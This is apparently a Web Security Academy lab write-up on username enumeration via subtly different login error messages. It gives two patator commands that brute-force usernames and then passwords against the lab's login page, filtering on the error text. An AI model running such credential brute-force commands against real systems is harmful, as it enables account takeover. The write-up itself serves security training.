# Username enumeration via subtly different responses

## First, we start with getting the error message printed out on providing invalid username.
![image](https://user-images.githubusercontent.com/86168235/126815822-a363fb4c-bdc4-4a2f-b9b9-cfed22f51d9e.png)

#### Command used
```
patator http_fuzz url=https://target-acf51fab1ee967598023465100180068.web-security-academy.net/login method=POST body='username=FILE0&password=lkshfklj' \
 0=usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid username or password."
```

### Screenshot
![image](https://user-images.githubusercontent.com/86168235/126816042-383c4982-f25a-4e15-a54e-c8d250196d8c.png)

## Next, we provide the valid username with a wrong password and see the error message is a bit off, i.e, without a fullstop.

![image](https://user-images.githubusercontent.com/86168235/126816813-2458788f-e2e3-4c04-91d8-bf0e27197801.png)


#### Command used
```
patator http_fuzz url=https://target-acf51fab1ee967598023465100180068.web-security-academy.net/login method=POST body='username=att&password=FILE0' \   
 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid username or password"
```

### Screenshot

![image](https://user-images.githubusercontent.com/86168235/126816694-8c0ae3ae-b259-4d02-85e0-9fa3633ac03c.png)

